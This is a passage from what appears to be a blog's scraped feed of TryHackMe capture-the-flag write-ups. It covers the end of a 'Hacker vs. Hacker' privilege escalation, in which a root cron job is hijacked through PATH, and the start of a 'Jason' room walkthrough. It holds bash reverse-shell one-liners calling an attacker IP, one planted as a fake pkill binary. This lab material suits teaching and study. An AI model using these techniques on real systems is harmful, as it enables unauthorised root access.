user.txt:\nlachlan@b2r:/home/lachlan$ cat user.txt thm{[REDACTED]} Privilege Escalation After using this tool https://github.com/DominicBreuker/pspy in order to monitor processes without root permissions, we identified a process pkill running without absolute path.\nlachlan@b2r:/home/lachlan$ ./pspy64 pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855    ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà ‚ñì‚ñà‚ñà ‚ñà‚ñà‚ñì  ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà ‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñí  ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí‚ñë ‚ñì‚ñà‚ñà‚ñÑ ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí ‚ñí‚ñà‚ñà ‚ñà‚ñà‚ñë  ‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí ‚ñí ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí ‚ñë ‚ñê‚ñà‚ñà‚ñì‚ñë  ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë ‚ñë ‚ñà‚ñà‚ñí‚ñì‚ñë  ‚ñí‚ñì‚ñí‚ñë ‚ñë ‚ñë‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñí‚ñì‚ñí‚ñë ‚ñë ‚ñë ‚ñà‚ñà‚ñí‚ñí‚ñí  ‚ñë‚ñí ‚ñë ‚ñë ‚ñë‚ñí ‚ñë ‚ñë‚ñë‚ñí ‚ñë ‚ñì‚ñà‚ñà ‚ñë‚ñí‚ñë  ‚ñë‚ñë ‚ñë ‚ñë ‚ñë ‚ñë‚ñë ‚ñí ‚ñí ‚ñë‚ñë  ‚ñë ‚ñë ‚ñë  ‚ñë ‚ñë  Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive) Draining file system events due to startup... done 2022/08/22 19:22:17 CMD: UID=0 PID=95 | 2022/08/22 19:22:17 CMD: UID=0 PID=94 | 2022/08/22 19:22:17 CMD: UID=0 PID=93 | 2022/08/22 19:22:17 CMD: UID=0 PID=911 | 2022/08/22 19:22:17 CMD: UID=0 PID=91 | 2022/08/22 19:22:17 CMD: UID=0 PID=90 | 2022/08/22 19:22:17 CMD: UID=0 PID=9 | 2022/08/22 19:22:17 CMD: UID=0 PID=89 | 2022/08/22 19:22:17 CMD: UID=0 PID=88 | 2022/08/22 19:22:17 CMD: UID=0 PID=87 | 2022/08/22 19:22:17 CMD: UID=0 PID=86 | 2022/08/22 19:22:17 CMD: UID=0 PID=85 | 2022/08/22 19:22:17 CMD: UID=0 PID=84 | 2022/08/22 19:22:17 CMD: UID=0 PID=82 | 2022/08/22 19:22:17 CMD: UID=0 PID=81 | 2022/08/22 19:22:17 CMD: UID=0 PID=806 | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --w ait-for-signal 2022/08/22 19:22:17 CMD: UID=0 PID=78 | 2022/08/22 19:22:17 CMD: UID=0 PID=779 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=77 | 2022/08/22 19:22:17 CMD: UID=0 PID=76 | 2022/08/22 19:22:17 CMD: UID=0 PID=75 | 2022/08/22 19:22:17 CMD: UID=0 PID=74 | 2022/08/22 19:22:17 CMD: UID=0 PID=73 | 2022/08/22 19:22:17 CMD: UID=0 PID=726 | /usr/bin/ssm-agent-worker 2022/08/22 19:22:17 CMD: UID=0 PID=72 | 2022/08/22 19:22:17 CMD: UID=0 PID=71 | 2022/08/22 19:22:17 CMD: UID=0 PID=709 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 2022/08/22 19:22:17 CMD: UID=0 PID=70 | 2022/08/22 19:22:17 CMD: UID=0 PID=69 | 2022/08/22 19:22:17 CMD: UID=0 PID=683 | /usr/sbin/ModemManager 2022/08/22 19:22:17 CMD: UID=0 PID=649 | /sbin/agetty -o -p -- \\u --noclear tty1 linux 2022/08/22 19:22:17 CMD: UID=0 PID=644 | /sbin/agetty -o -p -- \\u --keep-baud 115200,38400,9600 ttyS0 vt220 2022/08/22 19:22:17 CMD: UID=0 PID=633 | /usr/sbin/atd -f 2022/08/22 19:22:17 CMD: UID=0 PID=630 | /usr/lib/udisks2/udisksd 2022/08/22 19:22:17 CMD: UID=0 PID=628 | /lib/systemd/systemd-logind 2022/08/22 19:22:17 CMD: UID=0 PID=623 | /usr/lib/snapd/snapd 2022/08/22 19:22:17 CMD: UID=104 PID=619 | /usr/sbin/rsyslogd -n -iNONE 2022/08/22 19:22:17 CMD: UID=0 PID=615 | /usr/lib/policykit-1/polkitd --no-debug 2022/08/22 19:22:17 CMD: UID=0 PID=611 | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 2022/08/22 19:22:17 CMD: UID=103 PID=602 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd -activation --syslog-only 2022/08/22 19:22:17 CMD: UID=0 PID=6 | 2022/08/22 19:22:17 CMD: UID=0 PID=599 | /usr/sbin/cron -f 2022/08/22 19:22:17 CMD: UID=0 PID=593 | /usr/bin/amazon-ssm-agent 2022/08/22 19:22:17 CMD: UID=0 PID=592 | /usr/lib/accountsservice/accounts-daemon 2022/08/22 19:22:17 CMD: UID=101 PID=570 | /lib/systemd/systemd-resolved 2022/08/22 19:22:17 CMD: UID=100 PID=560 | /lib/systemd/systemd-networkd 2022/08/22 19:22:17 CMD: UID=102 PID=521 | /lib/systemd/systemd-timesyncd 2022/08/22 19:22:17 CMD: UID=0 PID=504 | 2022/08/22 19:22:17 CMD: UID=0 PID=503 | 2022/08/22 19:22:17 CMD: UID=0 PID=496 | 2022/08/22 19:22:17 CMD: UID=0 PID=494 | 2022/08/22 19:22:17 CMD: UID=0 PID=491 | 2022/08/22 19:22:17 CMD: UID=0 PID=483 | /sbin/multipathd -d -s 2022/08/22 19:22:17 CMD: UID=0 PID=482 | 2022/08/22 19:22:17 CMD: UID=0 PID=481 | 2022/08/22 19:22:17 CMD: UID=0 PID=480 | 2022/08/22 19:22:17 CMD: UID=0 PID=479 | 2022/08/22 19:22:17 CMD: UID=0 PID=4 | 2022/08/22 19:22:17 CMD: UID=0 PID=372 | /lib/systemd/systemd-udevd 2022/08/22 19:22:17 CMD: UID=0 PID=364 | 2022/08/22 19:22:17 CMD: UID=0 PID=343 | /lib/systemd/systemd-journald 2022/08/22 19:22:17 CMD: UID=0 PID=3 | 2022/08/22 19:22:17 CMD: UID=0 PID=269 | 2022/08/22 19:22:17 CMD: UID=0 PID=268 | 2022/08/22 19:22:17 CMD: UID=0 PID=2628 | /lib/systemd/systemd-udevd 2022/08/22 19:22:17 CMD: UID=0 PID=2624 | 2022/08/22 19:22:17 CMD: UID=1001 PID=2614 | ./pspy64 2022/08/22 19:22:17 CMD: UID=0 PID=2609 | /bin/sleep 51 2022/08/22 19:22:17 CMD: UID=0 PID=2608 | /bin/sleep 41 2022/08/22 19:22:17 CMD: UID=0 PID=2607 | /bin/sh -c /bin/sleep 51 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2606 | /bin/sleep 31 2022/08/22 19:22:17 CMD: UID=0 PID=2605 | /bin/sleep 21 2022/08/22 19:22:17 CMD: UID=0 PID=2602 | /bin/sh -c /bin/sleep 41 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2601 | /bin/sh -c /bin/sleep 31 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2600 | /bin/sh -c /bin/sleep 21 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:22:17 CMD: UID=0 PID=2595 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=0 PID=2594 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=0 PID=2593 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=0 PID=2592 | /usr/sbin/CRON -f 2022/08/22 19:22:17 CMD: UID=1001 PID=2455 | sh 2022/08/22 19:22:17 CMD: UID=0 PID=2452 | 2022/08/22 19:22:17 CMD: UID=1001 PID=2449 | (sd-pam) 2022/08/22 19:22:17 CMD: UID=1001 PID=2448 | /lib/systemd/systemd --user 2022/08/22 19:22:17 CMD: UID=33 PID=2436 | su lachlan 2022/08/22 19:22:17 CMD: UID=0 PID=23 | 2022/08/22 19:22:17 CMD: UID=0 PID=224 | 2022/08/22 19:22:17 CMD: UID=0 PID=22 | 2022/08/22 19:22:17 CMD: UID=0 PID=21 | 2022/08/22 19:22:17 CMD: UID=33 PID=2021 | bash -i 2022/08/22 19:22:17 CMD: UID=33 PID=2020 | sh -c bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.200.50/443 \u0026lt;\u0026amp;1\u0026#39; 2022/08/22 19:22:17 CMD: UID=0 PID=20 | 2022/08/22 19:22:17 CMD: UID=0 PID=2 | 2022/08/22 19:22:17 CMD: UID=0 PID=1993 | 2022/08/22 19:22:17 CMD: UID=0 PID=198 | 2022/08/22 19:22:17 CMD: UID=0 PID=1976 | 2022/08/22 19:22:17 CMD: UID=0 PID=19 | 2022/08/22 19:22:17 CMD: UID=0 PID=18 | 2022/08/22 19:22:17 CMD: UID=0 PID=170 | 2022/08/22 19:22:17 CMD: UID=0 PID=17 | 2022/08/22 19:22:17 CMD: UID=0 PID=16 | 2022/08/22 19:22:17 CMD: UID=0 PID=1585 | 2022/08/22 19:22:17 CMD: UID=33 PID=1536 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1534 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1533 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1515 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1514 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1500 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=15 | 2022/08/22 19:22:17 CMD: UID=33 PID=1490 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1478 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=33 PID=1468 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=14 | 2022/08/22 19:22:17 CMD: UID=0 PID=13 | 2022/08/22 19:22:17 CMD: UID=0 PID=120 | 2022/08/22 19:22:17 CMD: UID=0 PID=12 | 2022/08/22 19:22:17 CMD: UID=33 PID=1171 | /usr/sbin/apache2 -k start 2022/08/22 19:22:17 CMD: UID=0 PID=11 | 2022/08/22 19:22:17 CMD: UID=0 PID=107 | 2022/08/22 19:22:17 CMD: UID=0 PID=104 | 2022/08/22 19:22:17 CMD: UID=0 PID=10 | 2022/08/22 19:22:17 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity 2022/08/22 19:22:22 CMD: UID=0 PID=2632 | 2022/08/22 19:22:32 CMD: UID=0 PID=2635 | 2022/08/22 19:22:37 CMD: UID=0 PID=2636 | 2022/08/22 19:22:42 CMD: UID=0 PID=2639 | pkill -9 -t pts/ptmx 2022/08/22 19:22:52 CMD: UID=0 PID=2642 | 2022/08/22 19:23:01 CMD: UID=0 PID=2648 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2647 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2646 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2645 | /usr/sbin/cron -f 2022/08/22 19:23:01 CMD: UID=0 PID=2644 | /usr/sbin/cron -f 2022/08/22 19:23:01 CMD: UID=0 PID=2643 | /usr/sbin/cron -f 2022/08/22 19:23:01 CMD: UID=0 PID=2650 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2649 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2651 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2652 | /bin/sh -c /bin/sleep 11 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2654 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2653 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2655 | /bin/sh -c /bin/sleep 1 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2656 | /bin/sh -c /bin/sleep 21 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2657 | /bin/sh -c /bin/sleep 41 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2659 | /usr/sbin/CRON -f 2022/08/22 19:23:01 CMD: UID=0 PID=2658 | /bin/sh -c /bin/sleep 31 \u0026amp;\u0026amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope \u0026gt; /dev/pts/$f \u0026amp;\u0026amp; pkill -9 -t pts/$f; done 2022/08/22 19:23:01 CMD: UID=0 PID=2660 | /bin/sleep 51 2022/08/22 19:23:02 CMD: UID=0 PID=2663 | pkill -9 -t pts/ptmx Then we can modify PATH variable, in order to prepend /home/lachlan/bin, so we can create a malicious file named pkill, which will be executed from our location first.\nlachlan@b2r:/home/lachlan/bin$ export PATH=/home/lachlan/bin:$PATH lachlan@b2r:/home/lachlan/bin$ echo $PATH /home/lachlan/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin lachlan@b2r:/home/lachlan/bin$ echo \u0026#34;bash -c \u0026#39;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.8.200.50/444 \u0026lt;\u0026amp;1\u0026#39;\u0026#34; \u0026gt; pkill Then open another netcat listener and after a while the process pkill is executed with our file we get a root reverse shell.\nroot@b2r:~# cat root.txt thm{[REDACTED]} Proof of Concept (PoC image): ","permalink":"https://geobour98.com/write-ups/thm/hackervshacker/","summary":"üìÜ 22/08/2022 - geobour98 ‚åö 8 min\nIntroduction This is a TryHackMe room which can be found at: Hacker vs. Hacker\nSomeone has compromised this server already! Can you get in and evade their countermeasures?\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.156.143  geobour98@kali:~$ nmap -p- -T4 -v 10.10.156.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-22 21:48 EEST Initiating Ping Scan at 21:48 Scanning 10.","title":"TryHackMe - Hacker vs. Hacker"},{"content":"üìÜ 03/09/2022 - geobour98 ‚åö 7 min\nIntroduction This is a TryHackMe room which can be found at: Jason\nIn JavaScript everything is a terrible mistake.\nReconnaissance \u0026amp; Scanning Perform nmap scan to identify open ports and services.\n  Command: nmap -p- -T4 -v 10.10.121.122  geobour98@kali:~$ nmap -p- -T4 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:39 EEST Initiating Ping Scan at 19:39 Scanning 10.10.121.122 [2 ports] Completed Ping Scan at 19:39, 0.07s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:39 Completed Parallel DNS resolution of 1 host. at 19:39, 0.00s elapsed Initiating Connect Scan at 19:39 Scanning 10.10.121.122 (10.10.121.122) [65535 ports] Discovered open port 80/tcp on 10.10.121.122 Discovered open port 22/tcp on 10.10.121.122 Connect Scan Timing: About 42.14% done; ETC: 19:40 (0:00:43 remaining) Completed Connect Scan at 19:40, 63.87s elapsed (65535 total ports) Nmap scan report for 10.10.121.122 (10.10.121.122) Host is up (0.068s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http  Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 63.97 seconds Perform aggressive nmap scan to enable OS detection, default scripts and version detection on the found ports.\n  Command: sudo nmap -A -sC -p 22,80 -v 10.10.121.122  geobour98@kali:~$ sudo nmap -A -sC -p 22,80 -v 10.10.121.122 Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 19:41 EEST NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating Ping Scan at 19:41 Scanning 10.10.121.122 [4 ports] Completed Ping Scan at 19:41, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 19:41 Completed Parallel DNS resolution of 1 host. at 19:41, 0.00s elapsed Initiating SYN Stealth Scan at 19:41 Scanning 10.10.121.122 (10.10.121.122) [2 ports] Discovered open port 22/tcp on 10.10.121.122 Discovered open port 80/tcp on 10.10.121.122 Completed SYN Stealth Scan at 19:41, 0.12s elapsed (2 total ports) Initiating Service scan at 19:41 Scanning 2 services on 10.10.121.122 (10.10.121.122) Completed Service scan at 19:41, 15.27s elapsed (2 services on 1 host) Initiating OS detection (try #1) against 10.10.121.122 (10.10.121.122) Retrying OS detection (try #2) against 10.10.121.122 (10.10.121.122) Initiating Traceroute at 19:41 Completed Traceroute at 19:41, 0.07s elapsed Initiating Parallel DNS resolution of 1 host. at 19:41 Completed Parallel DNS resolution of 1 host. at 19:41, 0.00s elapsed NSE: Script scanning 10.10.121.122. Initiating NSE at 19:41 Completed NSE at 19:41, 3.53s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.14s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Nmap scan report for 10.10.121.122 (10.10.121.122) Host is up (0.069s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 5b:2d:9d:60:a7:45:de:7a:99:20:3e:42:94:ce:19:3c (RSA) | 256 bf:32:78:01:83:af:78:5e:e7:fe:9c:83:4a:7d:aa:6b (ECDSA) |_ 256 12üÜé13:80:e5:ad:73:07:c8:48:d5:ca:7c:7d:e0:af (ED25519) 80/tcp open http |_http-favicon: Unknown favicon MD5: 8FCEA7DE73B9ED47DE799DB3AE6363A8 | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Content-Type: text/html | Date: Wed, 31 Aug 2022 16:41:22 GMT | Connection: close | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Horror LLC\u0026lt;/title\u0026gt; | \u0026lt;style\u0026gt; | body { | background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b); | background-size: 300% 300%; | -webkit-animation: Background 10s ease infinite; | -moz-animation: Background 10s ease infinite; | animation: Background 10s ease infinite; | @-webkit-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @-moz-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @keyframes Background { | background-position: 0% 50% | background-posi | HTTPOptions: | HTTP/1.1 200 OK | Content-Type: text/html | Date: Wed, 31 Aug 2022 16:41:23 GMT | Connection: close | \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;Horror LLC\u0026lt;/title\u0026gt; | \u0026lt;style\u0026gt; | body { | background: linear-gradient(253deg, #4a040d, #3b0b54, #3a343b); | background-size: 300% 300%; | -webkit-animation: Background 10s ease infinite; | -moz-animation: Background 10s ease infinite; | animation: Background 10s ease infinite; | @-webkit-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @-moz-keyframes Background { | background-position: 0% 50% | background-position: 100% 50% | 100% { | background-position: 0% 50% | @keyframes Background { | background-position: 0% 50% |_ background-posi | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Horror LLC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port80-TCP:V=7.92%I=7%D=8/31%Time=630F8F33%P=x86_64-pc-linux-gnu%r(GetR SF:equest,E4B,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-Type:\\x20text/html\\r\\nDat SF:e:\\x20Wed,\\x2031\\x20Aug\\x202022\\x2016:41:22\\x20GMT\\r\\nConnection:\\x20cl SF:ose\\r\\n\\r\\n\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\\n\u0026lt;title\u0026gt;Horror\\x20LLC\u0026lt;/title\u0026gt;\\n\u0026lt;style\u0026gt;\\n\\x20\\x2 SF:0body\\x20{\\n\\x20\\x20\\x20\\x20background:\\x20linear-gradient\\(253deg,\\x20 SF:#4a040d,\\x20#3b0b54,\\x20#3a343b\\);\\n\\x20\\x20\\x20\\x20background-size:\\x2 SF:0300%\\x20300%;\\n\\x20\\x20\\x20\\x20-webkit-animation:\\x20Background\\x2010s SF:\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\x20-moz-animation:\\x20Background\\x2 SF:010s\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\x20animation:\\x20Background\\x20 SF:10s\\x20ease\\x20infinite;\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@-webkit-keyfram SF:es\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x2 SF:0background-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20 SF:50%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x20100%\\x2050%\\n SF:\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20100%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20b SF:ackground-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20}\\n\\x20\\x2 SF:0\\n\\x20\\x20@-moz-keyframes\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20\\x20\\x2 SF:0\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-po SF:sition:\\x20100%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20100%\\x20{\\n\\ SF:x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\ SF:x20}\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@keyframes\\x20Background\\x20{\\n\\x20\\ SF:x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\ SF:x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20background-posi\u0026#34;)%r(HTTPOptions,E4B,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nCo SF:ntent-Type:\\x20text/html\\r\\nDate:\\x20Wed,\\x2031\\x20Aug\\x202022\\x2016:41 SF::23\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\\n\u0026lt;title\u0026gt;Horror\\x SF:20LLC\u0026lt;/title\u0026gt;\\n\u0026lt;style\u0026gt;\\n\\x20\\x20body\\x20{\\n\\x20\\x20\\x20\\x20background:\\ SF:x20linear-gradient\\(253deg,\\x20#4a040d,\\x20#3b0b54,\\x20#3a343b\\);\\n\\x20 SF:\\x20\\x20\\x20background-size:\\x20300%\\x20300%;\\n\\x20\\x20\\x20\\x20-webkit- SF:animation:\\x20Background\\x2010s\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\x20- SF:moz-animation:\\x20Background\\x2010s\\x20ease\\x20infinite;\\n\\x20\\x20\\x20\\ SF:x20animation:\\x20Background\\x2010s\\x20ease\\x20infinite;\\n\\x20\\x20}\\n\\x2 SF:0\\x20\\n\\x20\\x20@-webkit-keyframes\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200 SF:%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20 SF:\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20backgr SF:ound-position:\\x20100%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x20100%\\ SF:x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-position:\\x200%\\x2050%\\n\\x20\\x SF:20\\x20\\x20}\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@-moz-keyframes\\x20Background SF:\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-posi SF:tion:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\x2050%\\x20{\\n\\x20\\x SF:20\\x20\\x20\\x20\\x20background-position:\\x20100%\\x2050%\\n\\x20\\x20\\x20\\x20 SF:}\\n\\x20\\x20\\x20\\x20100%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-positi SFüîõ\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20}\\n\\x20\\x20\\n\\x20\\x20@keyf SF:rames\\x20Background\\x20{\\n\\x20\\x20\\x20\\x200%\\x20{\\n\\x20\\x20\\x20\\x20\\x20 SF:\\x20background-position:\\x200%\\x2050%\\n\\x20\\x20\\x20\\x20}\\n\\x20\\x20\\x20\\ SF:x2050%\\x20{\\n\\x20\\x20\\x20\\x20\\x20\\x20background-posi\u0026#34;); Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.5 (92%) No exact OS matches for host (test conditions non-ideal). Uptime guess: 24.723 days (since Sun Aug 7 02:20:54 2022) Network Distance: 2 hops TCP Sequence Prediction: Difficulty=255 (Good luck!) IP ID Sequence Generation: All zeros Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 69.85 ms 10.8.0.1 (10.8.0.1) 2 68.05 ms 10.10.121.122 (10.10.121.122)  NSE: Script Post-scanning. Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Initiating NSE at 19:41 Completed NSE at 19:41, 0.00s elapsed Read data files from: /usr/bin/../share/nmap OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds  Raw packets sent: 75 (5.900KB) | Rcvd: 57 (4.656KB) Navigate to port 80, in the Email address field put test@test.com, open Burp Suite and Intercept the request. Then send it to Repeater. The request should look like this:\nPOST /?email=test@test.com HTTP/1.1 Host: 10.10.121.122 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: */* Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Origin: http://10.10.121.122 Connection: close Referer: http://10.10.121.122/ Content-Length: 0 Click the Send button and notice the response:\nHTTP/1.1 200 OK Set-Cookie: session=eyJlbWFpbCI6InRlc3RAdGVzdC5jb20ifQ==; Max-Age=900000; HttpOnly, Secure Content-Type: text/html Date: Wed, 31 Aug 2022 16:48:27 GMT Connection: close Content-Length: 3559  